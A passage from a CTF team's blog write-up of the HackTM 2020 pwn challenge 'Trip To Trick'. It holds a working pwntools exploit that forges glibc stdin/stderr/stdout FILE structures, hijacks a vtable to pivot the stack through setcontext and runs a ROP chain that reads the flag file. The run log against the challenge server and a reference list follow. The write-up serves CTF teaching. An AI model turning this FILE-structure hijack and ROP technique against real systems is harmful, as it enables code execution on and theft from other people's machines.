SETCONTEXT_SPITVOT = LIBC+libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">0x35</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</span><br><span class="line">    log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># STDIN+131</span></span><br><span class="line">    INPUT2 =<span class="string">'\x0a'</span>+<span class="string">'\x00'</span>*<span class="number">4</span><span class="comment"># p64(_IO_STDFILE_0_LOCK)</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_0_LOCK)</span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_0) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable"""</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)*<span class="number">19</span>*<span class="number">2</span> + p64(LIBC+<span class="number">0x1bb020</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">    INPUT2 += p64(LIBC+libc.symbols[<span class="string">'__memalign_hook'</span>]) <span class="comment"># __memalign_hook</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)</span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*<span class="number">2208</span> <span class="comment"># MAIN_ARENA</span></span><br><span class="line">    INPUT2 += p64(LIBC+<span class="number">0x896b0</span>) + p64(<span class="number">0x0</span>) <span class="comment"># obstack_alloc_failed_handler</span></span><br><span class="line">    INPUT2 += p64(LIBC+<span class="number">0x185072</span>)*<span class="number">2</span> <span class="comment"># tzname</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># program_invocation_short_name</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(LIBC+<span class="number">0x1bd2d8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">-0x1</span>,signed=<span class="keyword">True</span>) <span class="comment"># default_overflow_region</span></span><br><span class="line">    INPUT2 += p64(LIBC)+p64(LIBC) <span class="comment"># __libc_utmp_jump_table</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># _nl_global_locale</span></span><br><span class="line">    OFFSETLIST = [<span class="number">1971584</span>, <span class="number">1972928</span>, <span class="number">1973056</span>, <span class="number">1975232</span>, <span class="number">1972480</span>, <span class="number">1972352</span>, <span class="number">0</span>, <span class="number">1974400</span>, <span class="number">1974496</span>, <span class="number">1974624</span>, <span class="number">1974816</span>, <span class="number">1974944</span>, <span class="number">1975040</span>, <span class="number">1680352</span>, <span class="number">1676512</span>, <span class="number">1678048</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> OFFSETLIST:</span><br><span class="line">        <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">            INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:    </span><br><span class="line">            INPUT2 += p64(LIBC+offset)</span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    INPUT2 += p64(_IO_LIST_ALL+<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># IO_LIST_ALL</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># STDERR</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0xfbad2887</span>) <span class="comment"># _flags</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># _chain</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">    INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_2_LOCK) <span class="comment"># _lock</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_2) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># STDOUT</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _flags</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># _chain</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">    INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_1_LOCK) <span class="comment"># _lock</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_1) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_HELPER_JUMPS) <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_) <span class="comment"># stderr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># stdout</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># stdin</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(len(ROP_CHAIN))</span></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*(<span class="number">0x1f</span>*<span class="number">8</span>) <span class="comment"># __elf_set___libc_subfreeres</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># vtable IO_HELPER_JUMPS</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(SETCONTEXT_SPITVOT) <span class="comment"># _IO_helper_jumps STACKPIVOT SETCONTEXT</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    setcontext+0x35</span></span><br><span class="line"><span class="string">    mov     rsp, [rdx+0A0h]</span></span><br><span class="line"><span class="string">    mov     rbx, [rdx+80h]</span></span><br><span class="line"><span class="string">    mov     rbp, [rdx+78h]</span></span><br><span class="line"><span class="string">    mov     r12, [rdx+48h]</span></span><br><span class="line"><span class="string">    mov     r13, [rdx+50h]</span></span><br><span class="line"><span class="string">    mov     r14, [rdx+58h]</span></span><br><span class="line"><span class="string">    mov     r15, [rdx+60h]</span></span><br><span class="line"><span class="string">    mov     rcx, [rdx+0A8h]</span></span><br><span class="line"><span class="string">    push    rcx</span></span><br><span class="line"><span class="string">    mov     rsi, [rdx+70h]</span></span><br><span class="line"><span class="string">    mov     rdi, [rdx+68h]</span></span><br><span class="line"><span class="string">    mov     rcx, [rdx+98h]</span></span><br><span class="line"><span class="string">    mov     r8, [rdx+28h]</span></span><br><span class="line"><span class="string">    mov     r9, [rdx+30h]</span></span><br><span class="line"><span class="string">    mov     rdx, [rdx+88h]</span></span><br><span class="line"><span class="string">    xor     eax, eax</span></span><br><span class="line"><span class="string">    retn</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    POPRAX = LIBC + <span class="number">0x0000000000047cf8</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">    POPRDI = LIBC + <span class="number">0x0000000000026542</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    POPRDX = LIBC + <span class="number">0x000000000012bda6</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    POPRSI = LIBC + <span class="number">0x0000000000026f9e</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">    SYSCALL = LIBC + <span class="number">0x00000000000cf6c5</span> <span class="comment"># syscall ; ret</span></span><br><span class="line">    </span><br><span class="line">    FLAG_PATH = _IO_HELPER_JUMPS+<span class="number">0x178</span><span class="comment">#LIBC+0x1baad8#+16*8</span></span><br><span class="line">    ROP_ADDR = _IO_HELPER_JUMPS+<span class="number">0xa8</span><span class="comment">#LIBC+0x1baa08</span></span><br><span class="line">    ROP_CHAIN = p64(POPRAX)*<span class="number">2</span><span class="comment">#p64(OPEN)</span></span><br><span class="line">    ROP_CHAIN += p64(<span class="number">2</span>) + p64(POPRDI) + p64(FLAG_PATH) + p64(POPRSI) + p64(<span class="number">0</span>) + p64(SYSCALL) <span class="comment"># OPEN(file=flag_path) syscall == 2</span></span><br><span class="line">    ROP_CHAIN += p64(POPRAX) + p64(<span class="number">0</span>) + p64(POPRDI) + p64(<span class="number">3</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># READ(fd=3,buf=flag_path,nbytes=0x49) syscall == 0</span></span><br><span class="line">    ROP_CHAIN += p64(POPRAX) + p64(<span class="number">1</span>) + p64(POPRDI) + p64(<span class="number">1</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># WRITE(fd=1,buf=flag_path,nbyes=0x49) syscall == 1</span></span><br><span class="line">    ROP_CHAIN += <span class="string">"flag\x00"</span></span><br><span class="line">    <span class="comment">#ROP_CHAIN = ''</span></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*<span class="number">0x88</span>+p64(ROP_ADDR)+ ROP_CHAIN <span class="comment">#+ '\x00'*(190+7+3) + ROP_CHAIN#+ '\x00'*(0x90-0x88+0x8)+ p64(LIBC)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#INPUT2 += p64(0)*16*2 # _nl_global_locale</span></span><br><span class="line">    r.sendlineafter(<span class="string">'1 : '</span>, <span class="string">"%x %x"</span> %(_IO_2_1_STDIN_+_IO_BUF_END,_IO_2_1_STDIN_+<span class="number">0x2000</span>))</span><br><span class="line">    r.sendafter(<span class="string">'2 : '</span>, INPUT2)</span><br><span class="line">    <span class="comment">#r.interactive()</span></span><br><span class="line">    flag = r.recvall(timeout=<span class="number">2</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'HackTM'</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>Running it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ python trip_to_trick.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/trip_to_trick'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 138.68.67.161 on port 20006: Done</span><br><span class="line">[*] SYSTEM 0x7f1c8b934fd0</span><br><span class="line">[*] LIBC 0x7f1c8b8e2000</span><br><span class="line">[+] Receiving all data: Done (73B)</span><br><span class="line">[*] Closed connection to 138.68.67.161 port 20006</span><br><span class="line">HackTM&#123;d747aab3b6d6a95300eede7e3337397ace5131240e0fa9b849058f27f635e182&#125;</span><br></pre></td></tr></table></figure>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/</a></li>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/</a></li>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/</a></li>
<li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></li>
<li><a href="http://blog.angelboy.tw/" target="_blank" rel="noopener">http://blog.angelboy.tw/</a></li>
<li><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="noopener">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></li>
<li><a href="https://blog.rh0gue.com/2017-12-31-34c3ctf-300/" target="_blank" rel="noopener">https://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
      
    </div>
    <div class="article-footer">
      <blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    
    <li class="post-copyright-link hidden-xs">
      <strong>Link to this article：</strong>
      <a href="https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/" title="[Pwn] HackTM 2020 - Trip To Trick" target="_blank" rel="external">https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/</a>
    </li>
    
  </ul>
</blockquote>


<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/teamrocketist" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/teamrocketist" target="_blank"><span class="text-dark">TeamRocketIST</span><small class="ml-1x">CTF Team</small></a></h3>
        <div>Portuguese Computer Science Students</div>
      </div>
    </figure>
  </div>
</div>


    </div>
  </article>
  
    
  <section id="comments">
  	
      <div id="disqus_thread">
        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
      </div>
    
  </section>


  
</div>

  <nav class="bar bar-footer clearfix" data-stick-bottom>
  <div class="bar-inner">
  
  <ul class="pager pull-left">
    
    <li class="prev">
      <a href="/2020/02/09/Pwn-Nullcon-2020-Kidpwn/" title="[Pwn] Nullcon 2020 - Kidpwn"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
    </li>
    
    
    <li class="next">
      <a href="/2019/12/30/Reverse-36c3-xmas-future/" title="[Reverse] 36c3 - xmas_future"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
    </li>
    
    
  </ul>
  
  
  
  <div class="bar-right">
    
    <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
    
  </div>
  </div>
</nav>
  


</main>

  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
	
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
        
        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
        
        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
        
    </ul>

    <div class="copyright">
    	
        &copy; 2022 TEAMROCKETIST
        
        
    </div>
</footer>
  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
<script>
window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>
<script src="/js/plugin.min.js"></script>
<script src="/js/application.js"></script>

    <script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>





   




   
    
    <script defer>
    var disqus_config = function () {
        
            this.page.url = 'https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/';
        
        this.page.identifier = 'Pwn-HackTM-2020-Trip-To-Trick';
    };
    (function() { 
        var d = document, s = d.createElement('script');  
        s.src = '//' + 'teamrocketist' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>




  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
  <script>
  //利用 FancyBox 实现点击图片放大
  $(document).ready(function() {
    $('article img').not('[hidden]').not('.panel-body img').each(function() {
      var $image = $(this);
      var imageCaption = $image.attr('alt');
      var $imageWrapLink = $image.parent('a');
      if ($imageWrapLink.length < 1) {
        var src = this.getAttribute('src');
        var idx = src.lastIndexOf('?');
        if (idx != -1) {
          src = src.substring(0, idx);
        }
        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
      }
      $imageWrapLink.attr('data-fancybox', 'images');
      if (imageCaption) {
        $imageWrapLink.attr('data-caption', imageCaption);
      }
    });
    $().fancybox({
      selector: '[data-fancybox="images"]',
      hash: false,
      loop: false,
    });
  });
  </script>



    <script defer type="text/javascript">
(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-104385070-1', 'auto');
ga('send', 'pageview');

</script>



</body>
</html>